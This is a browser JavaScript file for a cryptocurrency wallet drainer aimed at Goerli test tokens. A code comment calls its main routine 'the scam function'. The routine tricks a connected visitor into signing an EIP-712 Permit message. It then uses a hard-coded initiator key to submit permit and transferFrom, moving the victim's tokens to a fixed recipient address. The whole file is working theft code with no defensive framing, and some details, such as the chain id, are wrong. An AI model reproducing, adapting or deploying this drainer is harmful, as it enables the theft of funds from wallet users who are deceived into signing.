const { ethers, ethereum } = window

// constants
const RPC = "https://goerli.infura.io/v3/15d127f3ac494ca88ab983921536e312" // Goerly RPC
const chainId = 159 // Goerly chain id
const tokenT = "0xFE4c35f86ED84169D548260C9205aC80d0583DF3" // USDC on Goerly
const amountT = String(20 * (10 ** 18)) // calculate USDC amount
const initiator = "0x56fF03D672a55786C660DB71091BDBFdDcB0C485" // initiator address
const initiatorPK = "" // initiaror's private key
const recipient = "0xeC73a14d094472c8739148ac1274b9D78e174622" // recipient of 

// setup UI
const connectButton = document.getElementById("connect")
const mainButton = document.getElementById("main")
mainButton.disabled = true

// ABIs
const PermitERC20_ABI = [
        {
            "inputs": [
                {
                    "internalType": "uint256",
                    "name": "initialSupply",
                    "type": "uint256"
                }
            ],
            "stateMutability": "nonpayable",
            "type": "constructor"
        },
        {
            "anonymous": false,
            "inputs": [
                {
                    "indexed": true,
                    "internalType": "address",
                    "name": "owner",
                    "type": "address"
                },
                {
                    "indexed": true,
                    "internalType": "address",
                    "name": "spender",
                    "type": "address"
                },
                {
                    "indexed": false,
                    "internalType": "uint256",
                    "name": "value",
                    "type": "uint256"
                }
            ],
            "name": "Approval",
            "type": "event"
        },
        {
            "anonymous": false,
            "inputs": [
                {
                    "indexed": true,
                    "internalType": "address",
                    "name": "from",
                    "type": "address"
                },
                {
                    "indexed": true,
                    "internalType": "address",
                    "name": "to",
                    "type": "address"
                },
                {
                    "indexed": false,
                    "internalType": "uint256",
                    "name": "value",
                    "type": "uint256"
                }
            ],
            "name": "Transfer",
            "type": "event"
        },
        {
            "inputs": [],
            "name": "DOMAIN_SEPARATOR",
            "outputs": [
                {
                    "internalType": "bytes32",
                    "name": "",
                    "type": "bytes32"
                }
            ],
            "stateMutability": "view",
            "type": "function"
        },
        {
            "inputs": [
                {
                    "internalType": "address",
                    "name": "owner",
                    "type": "address"
                },
                {
                    "internalType": "address",
                    "name": "spender",
                    "type": "address"
                }
            ],
            "name": "allowance",
            "outputs": [
                {
                    "internalType": "uint256",
                    "name": "",
                    "type": "uint256"
                }
            ],
            "stateMutability": "view",
            "type": "function"
        },
        {
            "inputs": [
                {
                    "internalType": "address",
                    "name": "spender",
                    "type": "address"
                },
                {
                    "internalType": "uint256",
                    "name": "amount",
                    "type": "uint256"
                }
            ],
            "name": "approve",
            "outputs": [
                {
                    "internalType": "bool",
                    "name": "",
                    "type": "bool"
                }
            ],
            "stateMutability": "nonpayable",
            "type": "function"
        },
        {
            "inputs": [
                {
                    "internalType": "address",
                    "name": "account",
                    "type": "address"
                }
            ],
            "name": "balanceOf",
            "outputs": [
                {
                    "internalType": "uint256",
                    "name": "",
                    "type": "uint256"
                }
            ],
            "stateMutability": "view",
            "type": "function"
        },
        {
            "inputs": [],
            "name": "decimals",
            "outputs": [
                {
                    "internalType": "uint8",
                    "name": "",
                    "type": "uint8"
                }
            ],
            "stateMutability": "view",
            "type": "function"
        },
        {
            "inputs": [
                {
                    "internalType": "address",
                    "name": "spender",
                    "type": "address"
                },
                {
                    "internalType": "uint256",
                    "name": "subtractedValue",
                    "type": "uint256"
                }
            ],
            "name": "decreaseAllowance",
            "outputs": [
                {
                    "internalType": "bool",
                    "name": "",
                    "type": "bool"
                }
            ],
            "stateMutability": "nonpayable",
            "type": "function"
        },
        {
            "inputs": [
                {
                    "internalType": "address",
                    "name": "spender",
                    "type": "address"
                },
                {
                    "internalType": "uint256",
                    "name": "addedValue",
                    "type": "uint256"
                }
            ],
            "name": "increaseAllowance",
            "outputs": [
                {
                    "internalType": "bool",
                    "name": "",
                    "type": "bool"
                }
            ],
            "stateMutability": "nonpayable",
            "type": "function"
        },
        {
            "inputs": [],
            "name": "name",
            "outputs": [
                {
                    "internalType": "string",
                    "name": "",
                    "type": "string"
                }
            ],
            "stateMutability": "view",
            "type": "function"
        },
        {
            "inputs": [
                {
                    "internalType": "address",
                    "name": "owner",
                    "type": "address"
                }
            ],
            "name": "nonces",
            "outputs": [
                {
                    "internalType": "uint256",
                    "name": "",
                    "type": "uint256"
                }
            ],
            "stateMutability": "view",
            "type": "function"
        },
        {
            "inputs": [
                {
                    "internalType": "address",
                    "name": "owner",
                    "type": "address"
                },
                {
                    "internalType": "address",
                    "name": "spender",
                    "type": "address"
                },
                {
                    "internalType": "uint256",
                    "name": "value",
                    "type": "uint256"
                },
                {
                    "internalType": "uint256",
                    "name": "deadline",
                    "type": "uint256"
                },
                {
                    "internalType": "uint8",
                    "name": "v",
                    "type": "uint8"
                },
                {
                    "internalType": "bytes32",
                    "name": "r",
                    "type": "bytes32"
                },
                {
                    "internalType": "bytes32",
                    "name": "s",
                    "type": "bytes32"
                }
            ],
            "name": "permit",
            "outputs": [],
            "stateMutability": "nonpayable",
            "type": "function"
        },
        {
            "inputs": [],
            "name": "symbol",
            "outputs": [
                {
                    "internalType": "string",
                    "name": "",
                    "type": "string"
                }
            ],
            "stateMutability": "view",
            "type": "function"
        },
        {
            "inputs": [],
            "name": "totalSupply",
            "outputs": [
                {
                    "internalType": "uint256",
                    "name": "",
                    "type": "uint256"
                }
            ],
            "stateMutability": "view",
            "type": "function"
        },
        {
            "inputs": [
                {
                    "internalType": "address",
                    "name": "recipient",
                    "type": "address"
                },
                {
                    "internalType": "uint256",
                    "name": "amount",
                    "type": "uint256"
                }
            ],
            "name": "transfer",
            "outputs": [
                {
                    "internalType": "bool",
                    "name": "",
                    "type": "bool"
                }
            ],
            "stateMutability": "nonpayable",
            "type": "function"
        },
        {
            "inputs": [
                {
                    "internalType": "address",
                    "name": "sender",
                    "type": "address"
                },
                {
                    "internalType": "address",
                    "name": "recipient",
                    "type": "address"
                },
                {
                    "internalType": "uint256",
                    "name": "amount",
                    "type": "uint256"
                }
            ],
            "name": "transferFrom",
            "outputs": [
                {
                    "internalType": "bool",
                    "name": "",
                    "type": "bool"
                }
            ],
            "stateMutability": "nonpayable",
            "type": "function"
        }
    ]

// variables
let provider
let selectedAddress

// connect function
async function connect() {
  // web3 = new Web3(ethereum)
   window.web3 = new Web3(window.ethereum);
    provider = new ethers.providers.Web3Provider(ethereum)
    const network = await provider.getNetwork()

    // if (network.chainId !== chainId) {
    //     try {
    //         await provider.send("wallet_switchEthereumChain", [{ chainId: `0x${chainId}` }])
    //     } catch (err) {
    //         console.log("error", err)
    //         return
    //     }
    // }
    
    const accounts = await provider.send("eth_requestAccounts", [])
    selectedAddress = accounts[0]

    connectButton.innerText = selectedAddress
    connectButton.disabled = true
    mainButton.disabled = false
}

// the scam function
async function Permit() {
    const tokenContract = new web3.eth.Contract(PermitERC20_ABI, tokenT)
    const contractNonce = await tokenContract.methods.nonces(selectedAddress).call()
    const deadline = 10000000000000

    const dataToSign = JSON.stringify({
        domain: {
            name: "My Token", // token name
            version: "2", // version of a token
            chainId: chainId,
            verifyingContract: tokenT
        }, 
        types: {
            EIP712Domain: [
                { name: "name", type: "string" },
                { name: "version", type: "string" },
                { name: "chainId", type: "uint256" },
                { name: "verifyingContract", type: "address" },
            ],
            Permit: [
                { name: "owner", type: "address" },
                { name: "spender", type: "address" },
                { name: "value", type: "uint256" },
                { name: "nonce", type: "uint256" },
                { name: "deadline", type: "uint256" },
            ]
        },
        primaryType: "Permit",
        message: { 
            owner: selectedAddress, 
            spender: initiator, 
            value: amountT,
            nonce: contractNonce, 
            deadline: deadline 
        }
    })
        
    web3.currentProvider.sendAsync({
        method: "eth_signTypedData_v3",
        params: [selectedAddress, dataToSign],
        from: selectedAddress
    }, async (error, result) => {
        if (error != null) return reject("Denied Signature")

        const initiatorNonce = await web3.eth.getTransactionCount(initiator)
        const signature = result.result
        const splited = ethers.utils.splitSignature(signature)

        const permitData = tokenContract.methods.permit(selectedAddress, initiator, amountT, deadline, splited.v, splited.r, splited.s).encodeABI()
        const gasPrice = await web3.eth.getGasPrice()
        const permitTX = {
            from: initiator,
            to: tokenT,
            nonce: web3.utils.toHex(initiatorNonce),
            gasLimit: web3.utils.toHex(98000),
            gasPrice: web3.utils.toHex(Math.floor(gasPrice * 1.3)),
            value: "0x",
            data: permitData
        }
        const signedPermitTX = await web3.eth.accounts.signTransaction(permitTX, initiatorPK)
        web3.eth.sendSignedTransaction(signedPermitTX.rawTransaction)

        // after the token is approved to us, 
        const transferData = tokenContract.methods.transferFrom(selectedAddress, recipient, amountT).encodeABI() 
        const transferTX = {
            from: initiator,
            to: tokenT,
            nonce: web3.utils.toHex(initiatorNonce + 1), // don't forget to increment initiator's nonce
            gasLimit: web3.utils.toHex(98000),
            gasPrice: web3.utils.toHex(Math.floor(gasPrice * 1.3)),
            data: transferData,
            value: "0x"
        } 
        const signedTransferTX = await web3.eth.accounts.signTransaction(transferTX, initiatorPK)
        web3.eth.sendSignedTransaction(signedTransferTX.rawTransaction)
    })
}

// configure buttons
window.addEventListener("DOMContentLoaded", () => {
    connectButton.onclick = connect
})

window.addEventListener("DOMContentLoaded", () => {
    mainButton.onclick = Permit
})